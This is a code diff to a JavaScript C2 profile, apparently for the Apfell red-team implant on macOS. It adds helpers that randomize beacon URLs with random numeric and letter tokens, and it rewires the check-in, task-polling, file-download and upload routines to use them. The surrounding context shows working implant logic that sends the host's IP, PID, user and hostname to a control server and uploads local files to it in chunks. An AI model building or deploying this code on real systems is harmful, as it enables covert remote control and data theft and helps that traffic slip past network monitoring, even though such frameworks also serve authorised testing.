@@ -11,6 +11,60 @@ class customC2 extends baseC2{
         this.id_field = "IDSTRING";
         this.host_header = "YYY";
 	}
+	getRandomMixed(size){
+	    return [...Array(size)].map(i=>(~~(Math.random()*36)).toString(36)).join('')
+	}
+	getRandomNumber(size){
+	    return [...Array(size)].map(i=>(~~(Math.random()*10)).toString(10)).join('')
+	}
+	getRandomAlpha(size){
+	    var s = "abcdefghijklmnopqrstuvwxyz";
+	    return Array(size).join().split(',').map(function() { return s.charAt(Math.floor(Math.random() * s.length)); }).join('');
+	}
+	getGetFilePath(id){
+	    var temp = this.get_file_path.replace(this.id_field, id);
+	    return this.stringReplaceRandomizations(temp);
+	}
+	getNextTaskPath(id){
+	    var temp = this.get_next_task.replace(this.id_field, id);
+	    return this.stringReplaceRandomizations(temp);
+	}
+	getPostResponsePath(id){
+	    var temp = this.post_response.replace(this.id_field, id);
+	    return this.stringReplaceRandomizations(temp);
+	}
+	getPostNewCallbackPath(){
+	    var temp = this.post_new_callback;
+	    return this.stringReplaceRandomizations(temp);
+	}
+    stringReplaceRandomizations(string){
+        //console.log("called string randomize with: " + string);
+        //will get a string like: /admin.php?q=5&page=(N4)&query=(M20)
+        var pieces = string.split("("); //[/admin.php?q=5&page=, N4)&query=, M20)]
+        //console.log("Pieces are: " + pieces.toString());
+        //if there are no requested transformations, then we'll have an array of length one and won't do the loop
+        var final_string = pieces[0];
+        for(var i = 1; i < pieces.length; i++){
+            var arg_split = pieces[i].split(")"); //[N4, &query=] and [M20,'']
+            //console.log("arg_split: " + arg_split.toString());
+            var config = arg_split[0]; //N4 and M20
+            var type = config[0]; //N and M
+            var size = parseInt(config.slice(1,)); //4 and 20
+            if(type == "N"){
+                //console.log("calling getRandomNumber with size: " + size);
+                final_string += this.getRandomNumber(size);
+            }
+            else if(type == "M"){
+                final_string += this.getRandomMixed(size);
+            }
+            else if(type == "A"){
+                //console.log("calling getRandomAlpha with size: " + size);
+                final_string += this.getRandomAlpha(size);
+            }
+            final_string += arg_split[1];
+        }
+        return final_string;
+    }
 	getConfig(){
 		//A RESTful base config consists of the following:
 		//  BaseURL (includes Port), CallbackInterval, KillDate (not implemented yet)
@@ -29,7 +83,7 @@ class customC2 extends baseC2{
 		//gets back a unique ID
 		var info = {'ip':ip,'pid':pid,'user':user,'host':host,'uuid':apfell.uuid};
 		//calls htmlPostData(url,data) to actually checkin
-		var jsondata = this.htmlPostData(this.post_new_callback, JSON.stringify(info));
+		var jsondata = this.htmlPostData(this.getPostNewCallbackPath(), JSON.stringify(info));
 		apfell.id = jsondata.id;
 		return jsondata;
 	}
@@ -37,7 +91,7 @@ class customC2 extends baseC2{
 		// http://ip/api/v1.0/tasks/callback/{implant.id}/nextTask
 		while(true){
 		    try{
-		        var url = this.baseurl + this.get_next_task.replace(this.id_field, apfell.id);
+		        var url = this.baseurl + this.getNextTaskPath(apfell.id);
 		        //var url = this.baseurl + "api/v1.0/tasks/callback/" + apfell.id + "/nextTask";
 		        var task = this.htmlGetData(url);
 		        return JSON.parse(task);
@@ -50,7 +104,7 @@ class customC2 extends baseC2{
 	}
 	postResponse(task, output){
 	    // this will get the task object and the response output
-	    return this.postRESTResponse(this.post_response.replace(this.id_field, task.id), output);
+	    return this.postRESTResponse(this.getPostResponsePath(task.id), output);
 	    //return this.postRESTResponse("api/v1.0/responses/" + task.id, output);
 	}
 	postRESTResponse(urlEnding, data){
@@ -122,7 +176,7 @@ class customC2 extends baseC2{
         // download just has one parameter of the path of the file to download
         if( does_file_exist(params)){
             var offset = 0;
-            var url = this.post_response.replace(this.id_field, task.id);
+            var url = this.getPostResponsePath(task.id);
             var chunkSize = 512000; //3500;
             var handle = $.NSFileHandle.fileHandleForReadingAtPath(params);
             // Get the file size by seeking;
@@ -165,7 +219,7 @@ class customC2 extends baseC2{
 	}
 	upload(task, params){
 	    try{
-	        var url = this.get_file_path.replace(this.id_field, params);
+	        var url = this.getGetFilePath(params);
 	        //var url = "api/v1.0/files/" + params;
             var file_data = this.htmlGetData(this.baseurl + url);
             var decoded_data = $.NSData.alloc.initWithBase64Encoding($(file_data));
